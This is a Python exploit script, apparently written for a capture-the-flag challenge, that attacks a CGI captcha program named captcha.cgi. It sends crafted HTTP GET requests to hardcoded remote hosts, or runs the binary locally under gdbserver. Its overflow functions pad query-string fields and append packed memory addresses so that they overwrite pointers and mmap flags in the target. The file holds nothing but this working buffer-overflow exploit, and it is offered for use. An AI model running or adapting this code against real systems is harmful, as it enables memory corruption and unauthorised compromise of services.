import socket
import re
import struct
import os
import sys
from subprocess import Popen
from subprocess import PIPE

def is_digit(c):
	return not b'ERROR t_s digit' in request('sent', bytes([c]), None)

def _make_querystring(q, t_s = None, v = None):
	qs = b'?q=' + bytes(q, 'ASCII')
	if t_s != None:
		qs += b'&t_s=' + t_s
	if v != None:
		qs += b'&v=' + v
	return qs

def request(q, t_s = None, v = None, useragent = None, remote=True, debug=False):
	if remote:
		return request_remote(q, t_s, v, useragent)
	else:
		return request_local(q, t_s, v, useragent, debug)


def request_remote(q,t_s = None, v = None, useragent = None, debug = False):
	if debug:
		path='/cgi-bin/captcha-debug.cgi'
		host='10.10.10.245'
	else:
		path='/captcha/captcha.cgi'
		host='61.42.25.20'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, 80))
	req = b'GET ' + bytes(path, 'ASCII')
	req += _make_querystring(q,t_s,v)
	s.sendall(req + b' HTTP/1.1\r\n')
	s.sendall(b'Host: ' + bytes(host, 'ASCII') + b'\r\n')
	if useragent != None:
		s.sendall(b'User-Agent: '+useragent+b'\r\n')
	else:
		s.sendall(b'User-Agent: foobar\r\n')
	s.sendall(b'\r\n')
	buf = b''
	while True:
		chunk = s.recv(1024)
		if chunk == b'':
			break
		buf += chunk
	return buf


def request_local(q,t_s = None, v = None, useragent = None, debug=False):
	if debug:
		args = ['/usr/bin/gdbserver', '--once', 'localhost:23946', './captcha.cgi']
	else:
		args = ['./captcha.cgi']
	env = {
		'REQUEST_METHOD': 'GET',
		'REMOTE_ADDR': '127.0.0.1',
		'REMOTE_PORT': '4242',
		'HTTP_USER_AGENT': useragent if useragent != None else 'foobar',
		'QUERY_STRING': _make_querystring(q,t_s,v),
		'PATH': os.environ['PATH']
	}
	p = Popen(args, bufsize = 4096, env = env,
	          stdin=PIPE, stdout=PIPE, stderr=PIPE)
	buf = b''
	while True:
		chunk = p.stdout.read(1024)
		if chunk == b'':
			break
		buf += chunk
	return buf
	

def overflow_qs(t_s, v, user_agent, t_s_buf_pointer, remote_port, name_100_buffer, remote_addr, mmap_flags, use_malloc, pad_ts, pad_v, pad_flags = b'xxx'):
	overflow_size = b'9' if use_malloc else b'7'
	t_s_param = t_s + bytes.ljust(pad_ts, 22, b'0') + overflow_size
	v_param = v + bytes.ljust(pad_v, 24, b'0')
	v_param += struct.pack('<L', user_agent)
	v_param += struct.pack('<L', t_s_buf_pointer)
	v_param += struct.pack('<L', remote_port)
	v_param += struct.pack('<L', name_100_buffer)
	v_param += struct.pack('<L', remote_addr)
	v_param += bytes.ljust(pad_flags, 3, b'x')
	v_param += struct.pack('B', mmap_flags)
	if use_malloc:
		v_param += b'1'
	return (t_s_param, v_param)

def exploit1_qs(t_s, v):
	str1_pos = 0x08049701
	null1_pos = 0x08049734
	#t_s_buf_pos_bin = struct.pack('<L', t_s_buf_pos)
	#return overflow_qs(t_s, v, str1_pos, null1_pos, 0x08048E46, str1_pos, 0x08048DEB, 0x32, False, b'', b'')
	return overflow_qs(t_s, v, str1_pos, null1_pos, 0x08048824, str1_pos, 0x08048DEB, 0x32, False, b'', b'')

def exploit2_qs(t_s, v):
	str1_pos = 0x08049701
	null1_pos = 0x08049734
	#t_s_buf_pos_bin = struct.pack('<L', t_s_buf_pos)
	return overflow_qs(t_s, v, str1_pos, null1_pos, 0x08048E46, str1_pos, 0x08048DEB, 0x32, False, b'', b'')
